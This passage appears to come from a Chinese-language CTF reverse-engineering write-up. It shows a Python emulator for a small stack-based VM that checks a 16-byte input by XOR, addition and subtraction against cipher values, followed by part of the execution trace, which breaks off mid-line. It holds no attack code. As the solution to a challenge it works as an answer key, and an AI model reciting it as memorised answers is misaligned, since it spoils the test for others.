class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><code class="hljs python">STACK_SIZE = <span class="hljs-number">256</span><br>MAX_OPCODES = <span class="hljs-number">1000</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-comment"># 指令流</span><br>    opcodes = [<br>        <span class="hljs-number">2</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>,<span class="hljs-number">14</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">16</span>,<span class="hljs-number">8</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,<span class="hljs-number">14</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">17</span>,<span class="hljs-number">8</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">14</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">18</span>,<span class="hljs-number">7</span>,<span class="hljs-number">0</span>,<br>        <span class="hljs-number">2</span>,<span class="hljs-number">4</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">14</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">19</span>,<span class="hljs-number">7</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">5</span>,<span class="hljs-number">2</span>,<span class="hljs-number">4</span>,<span class="hljs-number">14</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">20</span>,<span class="hljs-number">8</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">6</span>,<span class="hljs-number">2</span>,<span class="hljs-number">5</span>,<span class="hljs-number">14</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">21</span>,<span class="hljs-number">7</span>,<span class="hljs-number">0</span>,<br>        <span class="hljs-number">2</span>,<span class="hljs-number">7</span>,<span class="hljs-number">2</span>,<span class="hljs-number">6</span>,<span class="hljs-number">14</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">22</span>,<span class="hljs-number">7</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">8</span>,<span class="hljs-number">2</span>,<span class="hljs-number">7</span>,<span class="hljs-number">14</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">23</span>,<span class="hljs-number">7</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">9</span>,<span class="hljs-number">2</span>,<span class="hljs-number">8</span>,<span class="hljs-number">14</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">24</span>,<span class="hljs-number">7</span>,<span class="hljs-number">0</span>,<br>        <span class="hljs-number">2</span>,<span class="hljs-number">10</span>,<span class="hljs-number">2</span>,<span class="hljs-number">9</span>,<span class="hljs-number">14</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">25</span>,<span class="hljs-number">7</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">11</span>,<span class="hljs-number">2</span>,<span class="hljs-number">10</span>,<span class="hljs-number">14</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">26</span>,<span class="hljs-number">7</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">12</span>,<span class="hljs-number">2</span>,<span class="hljs-number">11</span>,<span class="hljs-number">14</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">27</span>,<span class="hljs-number">8</span>,<span class="hljs-number">0</span>,<br>        <span class="hljs-number">2</span>,<span class="hljs-number">13</span>,<span class="hljs-number">2</span>,<span class="hljs-number">12</span>,<span class="hljs-number">14</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">28</span>,<span class="hljs-number">8</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">14</span>,<span class="hljs-number">2</span>,<span class="hljs-number">13</span>,<span class="hljs-number">14</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">29</span>,<span class="hljs-number">7</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">15</span>,<span class="hljs-number">2</span>,<span class="hljs-number">14</span>,<span class="hljs-number">14</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">30</span>,<span class="hljs-number">8</span>,<span class="hljs-number">0</span>,<br>        <span class="hljs-number">16</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">16</span>,<span class="hljs-number">2</span>,<span class="hljs-number">17</span>,<span class="hljs-number">15</span>,<span class="hljs-number">0</span>,<span class="hljs-number">18</span>,<span class="hljs-number">84</span>,<span class="hljs-number">2</span>,<span class="hljs-number">31</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">3</span>,<span class="hljs-number">1</span><br>    ]<br><br>    <span class="hljs-comment"># 常量池（输入）</span><br>    co_consts = [<br>        <span class="hljs-number">0xB0</span>, <span class="hljs-number">0xC8</span>, <span class="hljs-number">0xFA</span>, <span class="hljs-number">0x86</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0x8F</span>, <span class="hljs-number">0xAF</span>, <span class="hljs-number">0xBF</span>,<br>        <span class="hljs-number">0xC9</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0xD7</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0xE3</span>, <span class="hljs-number">0xEF</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0x00</span><br>    ]<br><br>    <span class="hljs-comment"># cipher（目标值）</span><br>    cipher = [<br>        <span class="hljs-number">0xF3</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x1FD</span>, <span class="hljs-number">0x150</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0xB2</span>, <span class="hljs-number">0xDE</span>,<br>        <span class="hljs-number">0x15A</span>, <span class="hljs-number">0x197</span>, <span class="hljs-number">0x9C</span>, <span class="hljs-number">0x1D7</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0x146</span>, <span class="hljs-number">0x97</span><br>    ]<br><br>    <span class="hljs-comment"># 初始化栈</span><br>    stack_data = [<span class="hljs-number">0</span>] * STACK_SIZE<br>    sp = <span class="hljs-number">0</span><br><br>    <span class="hljs-comment"># 执行指令</span><br>    i = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> i &lt; <span class="hljs-built_in">len</span>(opcodes):<br>        opcode = opcodes[i]<br>        arg = opcodes[i + <span class="hljs-number">1</span>]<br><br>        sp0 = sp  <span class="hljs-comment"># 保存执行前的栈指针位置</span><br><br>        <span class="hljs-keyword">if</span> opcode == <span class="hljs-number">2</span>:<br>            <span class="hljs-comment"># PUSH co_consts[arg]</span><br>            v = co_consts[arg] <span class="hljs-keyword">if</span> arg &lt; <span class="hljs-built_in">len</span>(co_consts) <span class="hljs-keyword">else</span> <span class="hljs-number">0</span><br>            stack_data[sp] = v<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[IP=<span class="hljs-subst">&#123;i // <span class="hljs-number">2</span>&#125;</span>]\tstack_data[<span class="hljs-subst">&#123;sp&#125;</span>] = co_consts[<span class="hljs-subst">&#123;arg&#125;</span>] = 0x<span class="hljs-subst">&#123;v:X&#125;</span>&quot;</span>)<br>            sp += <span class="hljs-number">1</span><br><br>        <span class="hljs-keyword">elif</span> opcode == <span class="hljs-number">7</span>:<br>            <span class="hljs-comment"># ADD</span><br>            b = stack_data[sp - <span class="hljs-number">1</span>]<br>            a = stack_data[sp - <span class="hljs-number">2</span>]<br>            sp -= <span class="hljs-number">2</span><br>            stack_data[sp] = a + b<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[IP=<span class="hljs-subst">&#123;i // <span class="hljs-number">2</span>&#125;</span>]\tstack_data[<span class="hljs-subst">&#123;sp&#125;</span>] = a + b = stack_data[<span class="hljs-subst">&#123;sp0 - <span class="hljs-number">2</span>&#125;</span>] + stack_data[<span class="hljs-subst">&#123;sp0 - <span class="hljs-number">1</span>&#125;</span>] = 0x<span class="hljs-subst">&#123;a + b:X&#125;</span>&quot;</span>)<br>            sp += <span class="hljs-number">1</span><br><br>        <span class="hljs-keyword">elif</span> opcode == <span class="hljs-number">8</span>:<br>            <span class="hljs-comment"># SUB a - b</span><br>            b = stack_data[sp - <span class="hljs-number">1</span>]<br>            a = stack_data[sp - <span class="hljs-number">2</span>]<br>            sp -= <span class="hljs-number">2</span><br>            stack_data[sp] = a - b<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[IP=<span class="hljs-subst">&#123;i // <span class="hljs-number">2</span>&#125;</span>]\tstack_data[<span class="hljs-subst">&#123;sp&#125;</span>] = a - b = stack_data[<span class="hljs-subst">&#123;sp0 - <span class="hljs-number">2</span>&#125;</span>] - stack_data[<span class="hljs-subst">&#123;sp0 - <span class="hljs-number">1</span>&#125;</span>] = 0x<span class="hljs-subst">&#123;a - b:X&#125;</span>&quot;</span>)<br>            sp += <span class="hljs-number">1</span><br><br>        <span class="hljs-keyword">elif</span> opcode == <span class="hljs-number">14</span>:<br>            <span class="hljs-comment"># XOR</span><br>            b = stack_data[sp - <span class="hljs-number">1</span>]<br>            a = stack_data[sp - <span class="hljs-number">2</span>]<br>            sp -= <span class="hljs-number">2</span><br>            stack_data[sp] = a ^ b<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[IP=<span class="hljs-subst">&#123;i // <span class="hljs-number">2</span>&#125;</span>]\tstack_data[<span class="hljs-subst">&#123;sp&#125;</span>] = a ^ b = stack_data[<span class="hljs-subst">&#123;sp0 - <span class="hljs-number">2</span>&#125;</span>] ^ stack_data[<span class="hljs-subst">&#123;sp0 - <span class="hljs-number">1</span>&#125;</span>] = 0x<span class="hljs-subst">&#123;a ^ b:X&#125;</span>&quot;</span>)<br>            sp += <span class="hljs-number">1</span><br><br>        <span class="hljs-keyword">elif</span> opcode == <span class="hljs-number">15</span>:<br>            <span class="hljs-comment"># EQ</span><br>            b = stack_data[sp - <span class="hljs-number">1</span>]<br>            a = stack_data[sp - <span class="hljs-number">2</span>]<br>            sp -= <span class="hljs-number">2</span><br>            result = <span class="hljs-number">1</span> <span class="hljs-keyword">if</span> a == b <span class="hljs-keyword">else</span> <span class="hljs-number">0</span><br>            stack_data[sp] = result<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[IP=<span class="hljs-subst">&#123;i // <span class="hljs-number">2</span>&#125;</span>]\tstack_data[<span class="hljs-subst">&#123;sp&#125;</span>] = (a == b) = stack_data[<span class="hljs-subst">&#123;sp0 - <span class="hljs-number">2</span>&#125;</span>] == stack_data[<span class="hljs-subst">&#123;sp0 - <span class="hljs-number">1</span>&#125;</span>] = 0x<span class="hljs-subst">&#123;result:X&#125;</span>&quot;</span>)<br>            sp += <span class="hljs-number">1</span><br><br>        <span class="hljs-keyword">elif</span> opcode == <span class="hljs-number">16</span>:<br>            <span class="hljs-comment"># VERIFY</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[IP=<span class="hljs-subst">&#123;i // <span class="hljs-number">2</span>&#125;</span>]\t=== VERIFY cipher check ===&quot;</span>)<br>            <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>                expected = cipher[j] - <span class="hljs-number">20</span><br>                actual = stack_data[j]<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;    stack[<span class="hljs-subst">&#123;j:2d&#125;</span>]=0x<span class="hljs-subst">&#123;actual:X&#125;</span> vs cipher[<span class="hljs-subst">&#123;j:2d&#125;</span>]-20=0x<span class="hljs-subst">&#123;expected:X&#125;</span>&quot;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;✅ Verification complete.&quot;</span>)<br>            <span class="hljs-keyword">break</span>  <span class="hljs-comment"># 假设验证后程序结束</span><br><br>        <span class="hljs-keyword">elif</span> opcode == <span class="hljs-number">18</span>:<br>            <span class="hljs-comment"># JZ</span><br>            c = stack_data[sp - <span class="hljs-number">1</span>]<br>            sp -= <span class="hljs-number">1</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[IP=<span class="hljs-subst">&#123;i // <span class="hljs-number">2</span>&#125;</span>]\tJZ if top==0 jump to <span class="hljs-subst">&#123;arg&#125;</span> (top=0x<span class="hljs-subst">&#123;c:X&#125;</span>)&quot;</span>)<br>            <span class="hljs-keyword">if</span> c == <span class="hljs-number">0</span>:<br>                i = arg * <span class="hljs-number">2</span> - <span class="hljs-number">2</span>  <span class="hljs-comment"># 跳转到指定指令位置</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[IP=<span class="hljs-subst">&#123;i // <span class="hljs-number">2</span>&#125;</span>]\tUNKNOWN OPCODE <span class="hljs-subst">&#123;opcode&#125;</span>, abort&quot;</span>)<br>            <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span><br><br>        i += <span class="hljs-number">2</span>  <span class="hljs-comment"># 下一条指令</span><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure><p>过程：</p><p>每一步操作都是基于栈的，利用这三种运算<strong>异或（opcode&#x3D;14）</strong>、<strong>加法（opcode&#x3D;7）</strong>、<strong>减法（opcode&#x3D;8）</strong>，</p><p><em><strong>stack [2] 的生成为例（对应目标 t2）</strong></em></p><p>用户输入即co_consts的内容为x0-x15</p><p>步骤：</p><ul><li><p>[IP&#x3D;6]    加载 x2 到栈     stack[2] &#x3D; 0xFA &#x3D; x2；</p></li><li><p>[IP&#x3D;7]    加载 x1 到栈     stack[3] &#x3D; 0xC8 &#x3D; x1；</p></li><li><p>[IP&#x3D;8]    异或                   stack[2] &#x3D; stack[2]  ^ stack[3] &#x3D; x2 ^ x1；</p></li><li><p>[IP&#x3D;9]    加载 0到栈        stack[3] &#x3D; 0x0；</p></li><li><p>[IP&#x3D;10]   减法                  stack[2] &#x3D; stack[2] - stack[3]  &#x3D; stack[2] - 0  &#x3D; x2 ^ x1 。</p><p>需要满足x2 ^ x1 &#x3D; t2</p></li></ul><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><code class="hljs inform7"><span class="hljs-comment">[IP=0]</span>stack_data<span class="hljs-comment">[0]</span> = co_consts<span class="hljs-comment">[0]</span> = 0xB0<br><span class="hljs-comment">[IP=1]</span>stack_data<span class="hljs-comment">[1]</span> = co_consts<span class="hljs-comment">[1]</span> = 0xC8<br><span class="hljs-comment">[IP=2]</span>stack_data<span class="hljs-comment">[2]</span> = co_consts<span class="hljs-comment">[0]</span> = 0xB0<br><span class="hljs-comment">[IP=3]</span>stack_data<span class="hljs-comment">[1]</span> = a ^ b = stack_data<span class="hljs-comment">[1]</span> ^ stack_data<span class="hljs-comment">[2]</span> = 0x78<br><span class="hljs-comment">[IP=4]</span>stack_data<span class="hljs-comment">[2]</span> = co_consts<span class="hljs-comment">[16]</span> = 0x0<br><span class="hljs-comment">[IP=5]</span>stack_data<span class="hljs-comment">[1]</span> = a - b = stack_data<span class="hljs-comment">[1]</span> - stack_data<span class="hljs-comment">[2]</span> = 0x78<br><span class="hljs-comment">[IP=6]</span>stack_data<span class="hljs-comment">[2]</span> = co_consts<span class="hljs-comment">[2]</span> = 0xFA<br><span class="hljs-comment">[IP=7]</span>stack_data<span class="hljs-comment">[3]</span> = co_consts<span class="hljs-comment">[1]</span> = 0xC8<br><span class="hljs-comment">[IP=8]</span>stack_data<span class="hljs-comment">[2]</span> = a ^ b = stack_data<span class="hljs-comment">[2]</span> ^ stack_data<span class="hljs-comment">[3]</span> = 0x32<br><span class="hljs-comment">[IP=9]</span>stack_data<span class="hljs-comment">[3]</span> = co_consts<span class="hljs-comment">[17]</span> = 0x0<br><span class="hljs-comment">[IP=10]</span>stack_data<span class="hljs-comment">[2]</span> = a - b = stack_data<span class="hljs-comment">[2]</span> - stack_data<span class="hljs-comment">[3]</span> = 0x32<br><span class="hljs-comment">[IP=11]</span>stack_data<span class="hljs-comment">[3]</span> = co_consts<span class="hljs-comment">[3]</span> = 0x86<br><span class="hljs-comment">[IP=12]</span>stack_data<span class="hljs-comment">[4]</span> = co_consts<span class="hljs-comment">[2]</span> = 0xFA<br><span class="hljs-comment">[IP=13]</span>stack_data<span class="hljs-comment">[3]</span> = a ^ b = stack_data<span class="hljs-comment">[3]</span> ^ stack_data<span class="hljs-comment">[4]</span> = 0x7C<br><span class="hljs-comment">[IP=14]</span>stack_data<span class="hljs-comment">[4]</span> = co_consts<span class="hljs-comment">[18]</span> = 0x0<br><span class="hljs-comment">[IP=15]</span>stack_data<span class="hljs-comment">[3]</span> = a + b = stack_data<span class="hljs-comment">[3]</span> + stack_data<span class="hljs-comment">[4]</span> = 0x7C<br><span class="hljs-comment">[IP=16]</span>stack_data<span class="hljs-comment">[4]</span> = co_consts<span class="hljs-comment">[4]</span> = 0x6E<br><span class="hljs-comment">[IP=17]</span>stack_data<span class="hljs-comment">[5]</span> = co_consts<span class="hljs-comment">[3]</span> = 0x86<br><span class="hljs-comment">[IP=18]</span>stack_data<span class="hljs-comment">[4]</span> = a ^ b = stack_data<span class="hljs-comment">[4]</span> ^ stack_data<span class="hljs-comment">[5]</span> = 0xE8<br><span class="hljs-comment">[IP=19]</span>stack_data<span class="hljs-comment">[5]</span> = co_consts<span class="hljs-comment">[19]</span> = 0x0<br><span class="hljs-comment">[IP=20]</span>stack_data<span class="hljs-comment">[4]</span> = a + b = stack_data<span class="hljs-comment">[4]</span> + stack_data<span class="hljs-comment">[5]</span> = 0xE8<br><span class="hljs-comment">[IP=21]</span>stack_data<span class="hljs-comment">[5]</span> = co_consts<span class="hljs-comment">[5]</span> = 0x8F<br><span class="hljs-comment">[IP=22]</span>stack_data<span class="hljs-comment">[6]</span> = co_consts<span class="hljs-comment">[4]</span> = 0x6E<br><span class="hljs-comment">[IP=23]</span>stack_data<span class="hljs-comment">[5]</span> = a ^ b = stack_data<span class="hljs-comment">[5]</span> ^ stack_data<span class="hljs-comment">[6]</span> = 0xE1<br><span class="hljs-comment">[IP=24]</span>stack_data<span class="hljs-comment">[6]</span> = co_consts<span class="hljs-comment">[20]</span> = 0x0<br><span class="hljs-comment">[IP=25]</span>stack_data<span class="hljs-comment">[5]</span> = a - b = stack_data<span class="hljs-comment">[5]</span> - stack_data<span class="hljs-comment">[6]</span> = 0xE1<br><span class="hljs-comment">[IP=26]</span>stack_data<span class="hljs-comment">[6]</span> = co_consts<span class="hljs-comment">[6]</span> = 0xAF<br><span class="hljs-comment">[IP=27]</span>stack_data<span class="hljs-comment">[7]</span> = co_consts<span class="hljs-comment">[5]</span> = 0x8F<br><span class="hljs-comment">[IP=28]</span>stack_data<span class="hljs-comment">[6]</span> = a ^ b = stack_data<span class="hljs-comment">[6]</span> ^ stack_data<span class="hljs-comment">[7]</span> = 0x20<br><span class="hljs-comment">[IP=29]</span>stack_data<span class="hljs-comment">[7]</span> = co_consts<span class="hljs-comment">[21]</span> = 0x0<br><span class="hljs-comment">[IP=30]</span>stack_data<span class="hljs-comment">[6]</span> = a + b = stack_data<span class="hljs-comment">[6]</span> + stack_data<span class="hljs-comment">[7]</span> = 0x20<br><span class="hljs-comment">[IP=31]</span>stack_data<span class="hljs-comment">[7]</span> = co_consts<span class="hljs-comment">[7]</span> = 0xBF<br><span class="hljs-comment">[IP=32]</span>stack_data<span class="hljs-comment">[8]</span> = co_consts<span class="hljs-comment">[6]</span> = 0xAF<br><span class="hljs-comment">[IP=33]</span>stack_data<span class="hljs-comment">[7]</span> = a ^ b = stack_data<span class="hljs-comment">[7]</span> ^ stack_data<span class="hljs-comment">[8]</span> = 0x10<br><span class="hljs-comment">[IP=34]</span>stack_data<span class="hljs-comment">[8]</span> = co_consts<span class="hljs-comment">[22]</span> = 0x0<br><span class="hljs-comment">[IP=35]</span>stack_data<span class="hljs-comment">[7]</span> = a + b = stack_data<span class="hljs-comment">[7]</span> + stack_data<span class="hljs-comment">[8]</span> = 0x10<br><span class="hljs-comment">[IP=36]</span>stack_data<span class="hljs-comment">[8]</span> = co_consts<span class="hljs-comment">[8]</span> = 0xC9<br><span class="hljs-comment">[IP=37]</span>stack_data<span class="hljs-comment">[9]</span> = co_consts<span class="hljs-comment">[7]</span> = 0xBF<br><span class="hljs-comment">[IP=38]</span>stack_data<span class="hljs-comment">[8]</span> = a ^ b = stack_data<span class="hljs-comment">[8]</span> ^ stack_data<span class="hljs-comment">[9]</span> = 0x76<br><span class="hljs-comment">[IP=39]</span>stack_data<span class="hljs-comment">[9]</span> = co_consts<span class="hljs-comment">[23]</span> = 0x0<br><span class="hljs-comment">[IP=40]</span>stack_data<span class="hljs-comment">[8]</span> = a + b = stack_data<span class="hljs-comment">[8]</span> + stack_data<span class="hljs-comment">[9]</span> = 0x76<br><span class="hljs-comment">[IP=41]</span>stack_data<span class="hljs-comment">[9]</span> = co_consts<span class="hljs-comment">[9]</span> = 0x64<br><span class="hljs-comment">[IP=42]</span>stack_data<span class="hljs-comment">[10]</span> = co_consts<span class="hljs-comment">[8]</span> = 0xC9<br><span class="hljs-comment">[IP=43]</span>stack_data<span class="hljs-comment">[9]</span> = a ^ b = stack_data<span class="hljs-comment">[9]</span> ^ stack_data<span class="hljs-comment">[10]</span> = 0xAD<br><span class="hljs-comment">[IP=44]</span>stack_data<span class="hljs-comment">[10]</span> = co_consts<span class="hljs-comment">[24]</span> = 0x0<br><span class="hljs-comment">[IP=45]</span>stack_data<span class="hljs-comment">[9]</span> = a + b = stack_data<span class="hljs-comment">[9]</span> + stack_data<span class="hljs-comment">[10]</span> = 0xAD<br><span class="hljs-comment">[IP=46]</span>stack_data<span class="hljs-comment">[10]</span> = co_consts<span class="hljs-comment">[10]</span> = 0xD7<br><span class="hljs-comment">[IP=47]</span>stack_data<span class="hljs-comment">[11]</span> = co_consts<span class="hljs-comment">[9]</span> = 0x64<br><span class="hljs-comment">[IP=48]</span>stack_data<span class="hljs-comment">[10]</span> = a ^ b = stack_data<span class="hljs-comment">[10]</span> ^ stack_data<span class="hljs-comment">[11]</span> = 0xB3<br><span class="hljs-comment">[IP=49]</span>stack_data<span class="hljs-comment">[11]</span> = co_consts<span class="hljs-comment">[25]</span> = 0x0<br><span class="hljs-comment">[IP=50]</span>stack_data<span class="hljs-comment">[10]</span> = a + b = stack_data<span class="hljs-comment">[10]</span> + stack_data<span class="hljs-comment">[11]</span> = 0xB3<br><span class="hljs-comment">[IP=51]</span>stack_data<span class="hljs-comment">[11]</span> = co_consts<span class="hljs-comment">[11]</span> = 0xC3<br><span class="hljs-comment">[IP=52]</span>stack_data<span class="hljs-comment">[12]</span> = co_consts<span class="hljs-comment">[10]</span> = 0xD7<br><span class="hljs-comment">[IP=53]</span>stack_data<span class="hljs-comment">[11]</span> = a ^ b = stack_data<span class="hljs-comment">[11]</span> ^ stack_data<span class="hljs-comment">[12]</span> = 0x14<br><span class="hljs-comment">[IP=54]</span>stack_data<span class="hljs-comment">[12]</span> = co_consts<span class="hljs-comment">[26]</span> = 0x0<br><span class="hljs-comment">[IP=55]</span>stack_data<span class="hljs-comment">[11]</span> = a + b = stack_data<span class="hljs-comment">[11]</span> + stack_data<span class="hljs-comment">[12]</span> = 0x14<br><span class="hljs-comment">[IP=56]</span>stack_data<span class="hljs-comment">[12]</span> = co_consts<span class="hljs-comment">[12]</span> = 0xE3<br><span class="hljs-comment">[IP=57]</span>stack_data<span class="hljs-comment">[13]</span> = co_consts<span class="hljs-comment">[11]</span> = 0xC3<br><span class="hljs-comment">[IP=58]</span>stack_data<span class="hljs-comment">[12]</span> = a ^ b = stack_data<span class="hljs-comment">[12]</span> ^ stack_data<span class="hljs-comment">[13]</span> = 0x20<br><span class="hljs-comment">[IP=59]</span>stack_data<span class="hljs-comment">[13]</span> = co_consts<span class="hljs-comment">[27]</span> = 0x0<br><span class="hljs-comment">[IP=60]</span>stack_data<span class="hljs-comment">[12]</span> = a - b = stack_data<span class="hljs-comment">[12]</span> - stack_data<span class="hljs-comment">[13]</span> = 0x20<br><span class="hljs-comment">[IP=61]</span>stack_data<span class="hljs-comment">[13]</span> = co_consts<span class="hljs-comment">[13]</span> = 0xEF<br><span class="hljs-comment">[IP=62]</span>stack_data<span class="hljs-comment">[14]</span> = co_consts<span class="hljs-comment">[12]</span> = 0xE3<br><span class="hljs-comment">[IP=63]</span>stack_data<span class="hljs-comment">[13]</span> = a ^ b = stack_data<span class="hljs-comment">[13]</span> ^ stack_data<span class="hljs-comment">[14]</span> = 0xC<br><span class="hljs-comment">[IP=64]</span>stack_data<span class="hljs-comment">[14]</span> = co_consts<span class="hljs-comment">[28]</span> = 0x0<br><span class="hljs-comment">[IP=65]</span>stack_data<span class="hljs-comment">[13]</span> = a - b = stack_data<span class="hljs-comment">[13]</span> - stack_data<span class="hljs-comment">[14]</span> = 0xC<br><span class="hljs-comment">[IP=66]</span>stack_data<span class="hljs-comment">[14]</span> = co_consts<span class="hljs-comment">[14]</span> = 0x87<br><span class="hljs-comment">[IP=67]</span>stack_data<span class="hljs-comment">[15]</span> = co_consts<span class="hljs-comment">[13]</span> = 0xEF<br><span class="hljs-comment">[IP=68]</span>stack_data<span class="hljs-comment">[14]</span> = a ^ b = stack_data<span class="hljs-comment">[14]</span> ^ stack_data<span class="hljs-comment">[15]</span> = 0x68<br><span class="hljs-comment">[IP=69]</span>stack_data<span class="hljs-comment">[15]</span> = co_consts<span class="hljs-comment">[29]</span> = 0x0<br><span class="hljs-comment">[IP=70]</span>stack_data<span class="hljs-comment">[14]</span> = a + b = stack_data<span class="hljs-comment">[14]</span> + stack_data<span class="hljs-comment">[15]</span> = 0x68<br><span class="hljs-comment">[IP=71]</span>stack_data<span class="hljs-comment">[15]</span> = co_consts<span class="hljs-comment">[15]</span> = 0x0<br><span 